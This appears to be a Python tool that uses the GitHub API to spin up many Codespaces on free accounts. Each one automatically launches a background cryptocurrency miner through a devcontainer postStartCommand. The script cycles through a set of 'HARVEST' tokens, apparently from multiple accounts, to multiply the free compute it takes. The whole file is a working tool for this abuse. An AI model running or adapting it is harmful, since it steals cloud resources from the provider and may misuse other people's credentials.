#!/usr/bin/env python3
"""
GitHub Codespaces Zero-Auth Enroller
Free tier: 120 core-hours/month on free accounts.
Uses GitHub API to spin up codespaces that auto-run the miner via devcontainer.
"""
import requests, time, os
from datetime import datetime, timedelta

DEVCONTAINER = """
{{
  "image": "mcr.microsoft.com/devcontainers/python:3.11",
  "postCreateCommand": "pip install -r requirements.txt -q",
  "postStartCommand": "nohup python miner/git-mine-tty.py --rig-id ${{CODESPACE_NAME}} --algo auto --pool-repo Ox518/genFre &",
  "remoteEnv": {{
    "POOL_REPO": "Ox518/genFre"
  }}
}}
"""

class GithubCodespacesEnroller:
    BASE = 'https://api.github.com'

    def __init__(self):
        self.token = os.environ.get('GITHUB_TOKEN', '')
        self.headers = {'Authorization': f'Bearer {self.token}',
                        'Accept': 'application/vnd.github+json',
                        'X-GitHub-Api-Version': '2022-11-28'}

    def get_token(self, i):
        return os.environ.get(f'HARVEST_GH_TOKEN_{i}', self.token)

    def enroll(self, count, platform, secrets=None):
        workers = []
        pool_repo = 'Ox518/genFre'
        for i in range(count):
            token = self.get_token(i)
            h = {**self.headers, 'Authorization': f'Bearer {token}'}
            try:
                r = requests.post(
                    f'{self.BASE}/repos/{pool_repo}/codespaces', headers=h,
                    json={'ref': 'main',
                          'machine': 'basicLinux32gb',
                          'display_name': f'gitmine-harvest-{i}',
                          'retention_period_minutes': 43200})
                if r.status_code in (200, 201, 202):
                    cs = r.json()
                    name = cs.get('name', f'cs-{i}')
                    rig  = f'cs-{name}'
                    workers.append({'id': rig, 'algo': 'auto', 'hashrate': '~120KH/s',
                        'expires_at': (datetime.utcnow()+timedelta(days=30)).isoformat()+'Z',
                        'url': cs.get('web_url', f'https://github.com/codespaces/{name}')})
                    print(f'[codespaces] started {rig}')
                else:
                    print(f'[codespaces] create failed: {r.status_code} {r.text[:200]}')
            except Exception as e:
                print(f'[codespaces] error: {e}')
            time.sleep(10)
        return workers
